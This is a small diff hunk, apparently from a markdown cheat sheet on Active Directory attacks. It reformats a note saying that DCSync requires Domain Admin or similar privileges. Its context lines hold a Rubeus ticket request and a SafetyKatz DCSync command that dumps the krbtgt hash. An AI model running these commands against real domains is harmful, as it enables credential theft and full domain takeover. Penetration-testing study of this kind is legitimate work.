@@ -315,5 +315,4 @@ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly
 ```
 SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
-
-By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync
+[!IMPORTANT] By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync
